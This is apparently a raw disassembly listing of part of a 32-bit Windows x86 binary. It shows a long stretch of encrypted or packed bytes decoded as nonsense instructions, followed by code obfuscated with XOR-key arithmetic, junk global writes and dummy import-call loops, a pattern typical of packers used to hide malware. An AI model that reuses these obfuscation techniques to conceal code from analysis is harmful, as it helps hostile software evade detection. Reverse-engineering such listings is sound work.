  407f93:	test   DWORD PTR [edi],edx
  407f95:	rcr    DWORD PTR [esi-0x47ed466b],1
  407f9b:	add    DWORD PTR [ebx+esi*1-0x63e3f8f0],esi
  407fa2:	pop    ecx
  407fa3:	dec    eax
  407fa4:	int3   
  407fa5:	mov    bl,0x51
  407fa7:	hlt    
  407fa8:	cmp    edi,esp
  407faa:	dec    edx
  407fab:	dec    ebx
  407fac:	test   al,0xc1
  407fae:	xchg   edx,eax
  407faf:	push   ebx
  407fb0:	pop    es
  407fb1:	fcom   st(3)
  407fb3:	stos   DWORD PTR es:[edi],eax
  407fb4:	push   es
  407fb5:	push   es
  407fb6:	mov    ebp,0xdfc4bc64
  407fbb:	sub    esp,ecx
  407fbd:	nop
  407fbe:	mov    dh,0x14
  407fc0:	or     al,0xb9
  407fc2:	inc    ebx
  407fc3:	retf   0x3058
  407fc6:	cmp    ah,bl
  407fc8:	(bad)  
  407fc9:	leave  
  407fca:	jmp    FWORD PTR [ebx]
  407fcc:	inc    edi
  407fcd:	mov    al,0xac
  407fcf:	sar    eax,1
  407fd1:	in     al,dx
  407fd2:	mov    cl,0x7
  407fd4:	out    dx,al
  407fd5:	add    DWORD PTR [eax],ebp
  407fd7:	push   edx
  407fd8:	cwde   
  407fd9:	or     eax,0x9a4bd6b6
  407fde:	cmp    dl,BYTE PTR [ebp+eax*4-0x706906ed]
  407fe5:	outs   dx,DWORD PTR ds:[esi]
  407fe6:	hlt    
  407fe7:	push   cs
  407fe8:	outs   dx,DWORD PTR ds:[esi]
  407fe9:	push   ecx
  407fea:	jno    0x407fd2
  407fec:	scas   al,BYTE PTR es:[edi]
  407fed:	ss inc edx
  407fef:	adc    bl,ch
  407ff1:	hlt    
  407ff2:	add    dh,BYTE PTR [eax+0x40acff2c]
  407ff8:	loope  0x408059
  407ffa:	repz in al,0xe8
  407ffd:	nop
  407ffe:	js     0x407fe1
  408000:	ss jp  0x408041
  408003:	test   BYTE PTR [edi],dl
  408005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408006:	sub    al,0x98
  408008:	pop    edx
  408009:	sub    DWORD PTR [ebx],eax
  40800b:	cwde   
  40800c:	stos   DWORD PTR es:[edi],eax
  40800d:	repz inc edx
  40800f:	or     dl,BYTE PTR [ebp-0x6e]
  408012:	retf   0x2c82
  408015:	xor    eax,0xed040b96
  40801a:	lea    esp,[edx+0x76]
  40801d:	mov    ecx,0x7da1c8e2
  408022:	retf   
  408023:	out    dx,al
  408024:	hlt    
  408025:	and    al,0x52
  408027:	je     0x40801e
  408029:	xor    edx,DWORD PTR [ebp+0x25fd4d20]
  40802f:	dec    eax
  408030:	es mov dh,0x59
  408033:	mov    dl,0x71
  408035:	es scas al,BYTE PTR es:[edi]
  408037:	mov    dh,0xbc
  408039:	push   es
  40803a:	dec    ecx
  40803b:	scas   eax,DWORD PTR es:[edi]
  40803c:	popa   
  40803d:	scas   eax,DWORD PTR es:[edi]
  40803e:	test   BYTE PTR [ecx],ah
  408040:	out    0x1,eax
  408042:	dec    edi
  408043:	(bad)  
  408044:	into   
  408045:	clc    
  408046:	jno    0x40807a
  408048:	gs push edi
  40804a:	ins    DWORD PTR es:[edi],dx
  40804b:	sbb    eax,0x563aecfa
  408050:	aaa    
  408051:	fcmovnb st,st(3)
  408053:	sub    DWORD PTR [ebp-0x10],esi
  408056:	pop    ebx
  408057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408058:	sti    
  408059:	in     al,0x13
  40805b:	pusha  
  40805c:	jg     0x407fe3
  40805e:	stc    
  40805f:	mov    dl,0xe2
  408061:	add    bl,BYTE PTR [edx+0x1a0005ce]
  408067:	lods   al,BYTE PTR ds:[esi]
  408068:	in     eax,dx
  408069:	(bad)  
  40806a:	iret   
  40806b:	sub    eax,0xfb6bfe82
  408070:	dec    ebp
  408071:	cld    
  408072:	sub    bh,al
  408074:	sub    esp,DWORD PTR [edx]
  408076:	lods   al,BYTE PTR ds:[esi]
  408077:	cmp    DWORD PTR [eax+0xf],edi
  40807a:	cld    
  40807b:	add    esi,DWORD PTR [eax]
  40807d:	mov    dh,0x4b
  40807f:	xchg   edx,eax
  408080:	pop    eax
  408081:	pushf  
  408082:	(bad)  
  408083:	cmp    ecx,DWORD PTR [esi+0x4098d483]
  408089:	add    esp,DWORD PTR [ecx+0x65]
  40808c:	lods   al,BYTE PTR ds:[esi]
  40808d:	jno    0x408044
  40808f:	mov    bl,0xa
  408091:	inc    esp
  408092:	scas   eax,DWORD PTR es:[edi]
  408093:	mov    esi,0x64394772
  408098:	push   esi
  408099:	stos   BYTE PTR es:[edi],al
  40809a:	adc    DWORD PTR [esi-0x67],esp
  40809d:	dec    ebx
  40809e:	hlt    
  40809f:	stos   BYTE PTR es:[edi],al
  4080a0:	bound  edx,QWORD PTR [esi-0x2873f28a]
  4080a6:	mov    dl,BYTE PTR [ebx-0x45]
  4080a9:	xor    al,0x67
  4080ab:	mov    eax,DWORD PTR [edx+0x37]
  4080ae:	sbb    eax,0xf3d44370
  4080b3:	stos   BYTE PTR es:[edi],al
  4080b4:	stc    
  4080b5:	push   0xffffff8c
  4080b7:	pop    ds
  4080b8:	and    BYTE PTR [ebp+0xe17ed31],0x3
  4080bf:	mov    al,ds:0xae3f0251
  4080c4:	xor    DWORD PTR ds:[ecx+0x23],0x7afc683f
  4080cc:	std    
  4080cd:	neg    esp
  4080cf:	dec    ebp
  4080d0:	in     eax,dx
  4080d1:	mov    al,0x61
  4080d3:	sbb    ebx,DWORD PTR [eax-0x4d]
  4080d6:	xchg   DWORD PTR [ebx],ebp
  4080d8:	lea    eax,[esp+eiz*8-0x6610a0d6]
  4080df:	int3   
  4080e0:	mov    ah,0xc8
  4080e2:	loopne 0x4080cf
  4080e4:	inc    edi
  4080e5:	sbb    DWORD PTR [edi],esp
  4080e7:	(bad)  
  4080e8:	in     eax,dx
  4080e9:	or     cl,BYTE PTR [eax]
  4080eb:	int3   
  4080ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ed:	jmp    0x40811d
  4080ef:	pop    ecx
  4080f0:	xchg   ecx,eax
  4080f1:	arpl   WORD PTR [esp+edx*8-0x9],si
  4080f5:	jae    0x40809b
  4080f7:	mov    eax,DWORD PTR [ebx]
  4080f9:	jmp    0xdc7a4aa9
  4080fe:	pop    ecx
  4080ff:	and    DWORD PTR [edx+0x7b9ae27d],eax
  408105:	push   ss
  408106:	push   eax
  408107:	sbb    DWORD PTR [ebx],edi
  408109:	or     edx,esp
  40810b:	mov    ebx,0xd150bf3
  408110:	lods   eax,DWORD PTR ds:[esi]
  408111:	call   0xb527:0x695bb5dc
  408118:	(bad)  
  408119:	repnz (bad) 
  40811b:	in     al,dx
  40811c:	imul   esi,DWORD PTR [esi+0x67],0xffffffbc
  408120:	xchg   DWORD PTR [esi-0x6d],eax
  408123:	test   BYTE PTR [ebx-0x3408ae0c],cl
  408129:	popf   
  40812a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40812b:	or     ch,BYTE PTR [ecx]
  40812d:	and    al,BYTE PTR [edi-0x6d]
  408130:	cmp    edi,ecx
  408132:	and    eax,0xf44c9b3f
  408137:	cmp    al,0xd0
  408139:	sbb    eax,0x8a8f7b7a
  40813e:	xchg   BYTE PTR [ecx+0x24],dl
  408141:	stos   BYTE PTR es:[edi],al
  408142:	pushf  
  408143:	sub    ebp,ebx
  408145:	aad    0x94
  408147:	cmp    al,0x5a
  408149:	and    ebp,DWORD PTR [ecx-0x30]
  40814c:	dec    BYTE PTR [ebp+0x5805dac7]
  408152:	inc    esi
  408153:	xor    BYTE PTR [edi-0x20],dh
  408156:	loope  0x408143
  408158:	into   
  408159:	imul   BYTE PTR [ecx+0x305d4612]
  40815f:	int    0x7
  408161:	mov    dl,0xc6
  408163:	xchg   ebx,eax
  408164:	cmp    al,0xee
  408166:	mov    DWORD PTR [ebx+0x5c24ddf3],ebx
  40816c:	mov    eax,0xd5ee6c48
  408171:	mov    ds:0x83383676,eax
  408176:	push   ebx
  408177:	or     esp,ecx
  408179:	aam    0x48
  40817b:	add    eax,DWORD PTR [esi-0x7e]
  40817e:	iret   
  40817f:	and    eax,0x3fa37ecc
  408184:	clc    
  408185:	scas   eax,DWORD PTR es:[edi]
  408186:	dec    edx
  408187:	inc    ebx
  408188:	adc    DWORD PTR [esi+0x42fa8b66],0xffffff9a
  40818f:	pop    ebx
  408190:	mov    eax,ds:0xb207b44d
  408195:	mov    al,0x22
  408197:	fcom   QWORD PTR [esi-0x5117626f]
  40819d:	xlat   BYTE PTR ds:[ebx]
  40819e:	out    dx,eax
  40819f:	not    BYTE PTR [ecx]
  4081a1:	add    esp,esi
  4081a3:	rcl    BYTE PTR [edi],0xf3
  4081a6:	add    BYTE PTR [esi+0x78],bh
  4081a9:	loop   0x408150
  4081ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081ac:	inc    edi
  4081ad:	and    cl,BYTE PTR [ebx-0x6]
  4081b0:	int    0x5b
  4081b2:	in     al,dx
  4081b3:	or     eax,0x98c8d11e
  4081b8:	mov    ebx,0xbd49a2ef
  4081bd:	sar    esp,cl
  4081bf:	sbb    eax,DWORD PTR [eax-0x1c]
  4081c2:	add    bh,0xc2
  4081c5:	mov    edi,0x7d07fb39
  4081ca:	inc    edi
  4081cb:	mov    BYTE PTR [ebx-0x76],bl
  4081ce:	loope  0x40818f
  4081d0:	jb     0x408180
  4081d2:	mov    es,esp
  4081d4:	int3   
  4081d5:	jns    0x40817d
  4081d7:	push   0xfd9fedc9
  4081dc:	lahf   
  4081dd:	mov    bl,0x7c
  4081df:	test   DWORD PTR [ecx+0x49591a72],edx
  4081e5:	outs   dx,BYTE PTR ds:[esi]
  4081e6:	mov    al,bl
  4081e8:	sub    ebp,edx
  4081ea:	cmp    BYTE PTR [ecx],0x2f
  4081ed:	mov    dl,0x97
  4081ef:	nop
  4081f0:	mov    eax,ds:0xb7b297c2
  4081f5:	mov    ebp,0x5f7df270
  4081fa:	push   ebp
  4081fb:	pop    esp
  4081fc:	call   0x3dc886e5
  408201:	mov    bl,0xf0
  408203:	sbb    al,0x40
  408205:	or     al,0x28
  408207:	mov    edi,DWORD PTR [eax-0x40]
  40820a:	xchg   ebx,eax
  40820b:	xor    eax,0x76996fa
  408210:	inc    ebp
  408211:	ss ins BYTE PTR es:[edi],dx
  408213:	fcomp  st(4)
  408215:	sbb    eax,0xbe47cc68
  40821a:	inc    ebp
  40821b:	adc    al,BYTE PTR [eax]
  40821d:	jp     0x408244
  40821f:	cmp    al,0xfb
  408221:	cmp    edi,0x11
  408224:	and    dh,BYTE PTR [esi+edx*8-0x7c]
  408228:	ror    DWORD PTR [esi-0x2c],1
  40822b:	fwait
  40822c:	iret   
  40822d:	fcompp 
  40822f:	add    al,0xd7
  408231:	add    BYTE PTR [esi-0x7fe62b2b],dl
  408237:	or     edx,DWORD PTR [ecx-0x314c5729]
  40823d:	rcl    cl,0xac
  408240:	mov    ss,WORD PTR [edx]
  408242:	mov    DWORD PTR [esi],0xfb8a9411
  408248:	rep lods eax,DWORD PTR ds:[esi]
  40824a:	mov    bh,0xd9
  40824c:	cmp    eax,0x753c09c0
  408251:	lods   eax,DWORD PTR ds:[esi]
  408252:	dec    ecx
  408253:	jbe    0x4081f9
  408255:	in     eax,dx
  408256:	sub    al,0x3a
  408258:	adc    ebp,DWORD PTR [ecx-0x29]
  40825b:	jmp    0x1595fb4e
  408260:	(bad)  
  408261:	cmp    eax,0xc98bde31
  408266:	inc    edi
  408267:	jb     0x408215
  408269:	ins    DWORD PTR es:[edi],dx
  40826a:	(bad)  
  40826b:	fisub  WORD PTR ds:0x18d05dd
  408271:	sbb    edx,DWORD PTR [ecx]
  408273:	xchg   esp,eax
  408274:	adc    ebx,DWORD PTR [ecx]
  408276:	or     edi,esp
  408278:	or     al,0x3b
  40827a:	jmp    DWORD PTR [eax-0x298f0eeb]
  408280:	dec    edx
  408281:	or     eax,0x4474fcb5
  408286:	push   es
  408287:	outs   dx,BYTE PTR gs:[esi]
  408289:	lods   eax,DWORD PTR ds:[esi]
  40828a:	ja     0x4082fe
  40828c:	pop    ds
  40828d:	jae    0x4082fd
  40828f:	dec    edi
  408290:	test   DWORD PTR [edi+0x37d67728],edx
  408296:	jae    0x408293
  408298:	shl    DWORD PTR [ecx+0x636d121b],1
  40829e:	(bad)  
  4082a0:	dec    edi
  4082a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082a2:	jmp    0x3003:0x9c9a349d
  4082a9:	adc    BYTE PTR [esi+0x2924bd1],dh
  4082af:	inc    ebx
  4082b0:	pop    esp
  4082b1:	test   eax,0xfd1450d0
  4082b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082b7:	lods   eax,DWORD PTR ds:[esi]
  4082b8:	mov    ebx,0x4e1b96b6
  4082bd:	jae    0x4082a1
  4082bf:	sbb    DWORD PTR [ecx-0x1a],ebp
  4082c2:	pop    ecx
  4082c3:	mov    ebx,DWORD PTR [ecx+0x10]
  4082c6:	in     eax,0x7b
  4082c8:	push   0xe14cd1f3
  4082cd:	test   DWORD PTR [ecx+0x4060df9],ecx
  4082d3:	ss cmp eax,0x9c54c9fd
  4082d9:	or     BYTE PTR [ecx],0x8f
  4082dc:	stc    
  4082dd:	in     al,dx
  4082de:	adc    edx,DWORD PTR [eax+0x54]
  4082e1:	repz out 0xff,eax
  4082e4:	inc    ebx
  4082e5:	fwait
  4082e6:	stos   BYTE PTR es:[edi],al
  4082e7:	xor    ch,bl
  4082e9:	ret    
  4082ea:	pushf  
  4082eb:	fs pop ss
  4082ed:	pop    esp
  4082ee:	xor    eax,0x385f80f4
  4082f3:	fild   QWORD PTR [ecx-0x28]
  4082f6:	sbb    al,0xdd
  4082f8:	mov    ebx,0xd2d65b0d
  4082fd:	cld    
  4082fe:	adc    BYTE PTR [ebp+0x33],ch
  408301:	scas   eax,DWORD PTR es:[edi]
  408302:	cli    
  408303:	cmp    DWORD PTR [eax-0x7d43d01c],ecx
  408309:	jb     0x4082f8
  40830b:	xor    cl,bl
  40830d:	jo     0x4082af
  40830f:	dec    esi
  408310:	xor    BYTE PTR [eax-0x28],al
  408313:	mov    ecx,0x68a87f83
  408318:	cdq    
  408319:	es mov dh,0xb5
  40831c:	mov    WORD PTR ds:0x6da1c14e,gs
  408322:	int3   
  408323:	inc    esi
  408324:	test   DWORD PTR [edx-0x1d],ecx
  408327:	jns    0x408335
  408329:	jmp    FWORD PTR ds:0xcc37f9a7
  40832f:	add    BYTE PTR [ebx-0x3a],0x1b
  408333:	ins    BYTE PTR es:[edi],dx
  408334:	je     0x40836f
  408336:	xchg   dl,cl
  408338:	jmp    0x7337:0x1187d0ba
  40833f:	sub    edi,esp
  408341:	sbb    BYTE PTR [ebx+edi*4],ah
  408344:	add    al,0x9d
  408346:	enter  0x6a1d,0x4a
  40834a:	and    eax,0xf20793a4
  40834f:	pop    ebx
  408350:	cwde   
  408351:	mov    esi,0xe3b5065a
  408356:	ror    BYTE PTR [eax],0xd1
  408359:	loop   0x4083c4
  40835b:	adc    DWORD PTR [ecx+0x29],eax
  40835e:	xchg   DWORD PTR [eax+0x447cc36b],eax
  408364:	sub    ebx,esi
  408366:	ret    0xd5fb
  408369:	das    
  40836a:	mov    esi,0xb8a31a2c
  40836f:	xchg   esp,eax
  408370:	xor    ecx,ebp
  408372:	jne    0x40839c
  408374:	not    bl
  408376:	cmp    ebx,0xffe4b942
  40837c:	test   al,0x9c
  40837e:	gs pushf 
  408380:	(bad)
  408383:	outs   dx,BYTE PTR ds:[esi]
  408384:	pop    ebp
  408385:	mov    ch,0xc3
  408387:	xchg   esi,eax
  408388:	jecxz  0x408350
  40838a:	stos   DWORD PTR es:[edi],eax
  40838b:	popa   
  40838c:	and    DWORD PTR ds:0x7311c054,edx
  408392:	ret    
  408393:	xchg   edx,eax
  408394:	adc    DWORD PTR [esi-0x7b1877ed],0x1cc60c3f
  40839e:	push   0x141ddf43
  4083a3:	ins    BYTE PTR es:[edi],dx
  4083a4:	cmp    ebx,edi
  4083a6:	pop    ss
  4083a7:	stos   DWORD PTR es:[edi],eax
  4083a8:	cs popa 
  4083aa:	jmp    0x408409
  4083ac:	clc    
  4083ad:	push   0x26
  4083af:	fld    QWORD PTR [ebx+0x7a]
  4083b2:	cmp    dl,BYTE PTR [ebx+0x37]
  4083b5:	shrd   DWORD PTR [edi-0x7653c07c],eax,0xdd
  4083bd:	arpl   bp,dx
  4083bf:	sti    
  4083c0:	cmp    BYTE PTR [ebp+0x7af4ac55],bl
  4083c6:	mov    bh,0xff
  4083c8:	mov    al,0x2a
  4083ca:	adc    eax,0x8e33d0f0
  4083cf:	imul   esp,DWORD PTR [eax-0x29],0xffffffd6
  4083d3:	mov    dh,0xb0
  4083d5:	leave  
  4083d6:	stc    
  4083d7:	out    0xf9,al
  4083d9:	xchg   ebx,eax
  4083da:	cmp    al,cl
  4083dc:	mov    ah,0xf0
  4083de:	pop    ecx
  4083df:	arpl   sp,si
  4083e1:	arpl   WORD PTR [ebx],di
  4083e3:	adc    al,0xef
  4083e5:	pop    esi
  4083e6:	mov    esi,0x6107fd1e
  4083eb:	(bad)  
  4083ec:	ja     0x408415
  4083ee:	iret   
  4083ef:	inc    ebx
  4083f0:	popf   
  4083f1:	retf   0xfcec
  4083f4:	adc    eax,0xb1d3d4be
  4083f9:	enter  0x1d97,0xe2
  4083fd:	and    BYTE PTR [edi-0x10],bl
  408400:	xchg   ebx,eax
  408401:	cwde   
  408402:	popf   
  408403:	js     0x408395
  408405:	push   es
  408406:	or     DWORD PTR [ebp-0xec8832a],0x1746ccff
  408410:	bound  eax,QWORD PTR [eax-0x63]
  408413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408414:	addr16 add eax,0xfdacbfd1
  40841a:	pop    ebp
  40841b:	adc    al,0x66
  40841d:	adc    al,BYTE PTR [eax]
  40841f:	loope  0x408454
  408421:	sbb    BYTE PTR [esi+0x764f7a3b],0xc4
  408428:	adc    al,BYTE PTR [esi+ecx*4]
  40842b:	xor    DWORD PTR [edx-0x64a0228c],esi
  408431:	sub    edx,edi
  408433:	jnp    0x40841d
  408435:	lahf   
  408436:	repz mov ah,0xfc
  408439:	jecxz  0x408473
  40843b:	popa   
  40843c:	cmp    DWORD PTR [ecx+0x6a7a008d],esi
  408442:	push   esp
  408443:	mov    es,ecx
  408445:	stos   BYTE PTR es:[edi],al
  408446:	dec    ebp
  408447:	sbb    BYTE PTR [esi],0xdf
  40844a:	push   ebp
  40844b:	push   ss
  40844c:	stc    
  40844d:	or     DWORD PTR [ecx],0xd31133ef
  408453:	rol    BYTE PTR [ecx-0x12],cl
  408456:	(bad)  
  408457:	ins    BYTE PTR es:[edi],dx
  408458:	jo     0x40845c
  40845a:	xchg   ecx,eax
  40845b:	add    eax,0x82caba02
  408460:	aas    
  408461:	fsubrp st(3),st
  408463:	or     al,0xc7
  408465:	adc    DWORD PTR [eax],edi
  408467:	retf   
  408468:	xchg   BYTE PTR [edx+0x45881004],cl
  40846e:	dec    DWORD PTR [ebx+0x558bd045]
  408474:	hlt    
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
